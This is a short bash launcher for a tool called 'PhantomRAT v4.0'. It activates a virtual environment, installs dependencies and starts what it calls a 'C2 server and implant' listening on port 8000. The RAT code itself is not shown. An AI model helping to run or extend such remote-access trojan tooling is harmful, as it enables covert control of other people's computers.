#!/bin/bash
echo "==========================================="
echo "   Starting PhantomRAT v4.0"
echo "==========================================="
echo ""

# Activate virtual environment
source venv/bin/activate

# Install missing dependencies if needed
if [ ! -f ".deps_installed" ]; then
    echo "[*] Installing dependencies..."
    pip install -r requirements.txt
    touch .deps_installed
fi

# Start PhantomRAT
echo "[*] Starting C2 server and implant..."
python run.py --mode both --host 0.0.0.0 --port 8000 --optimize
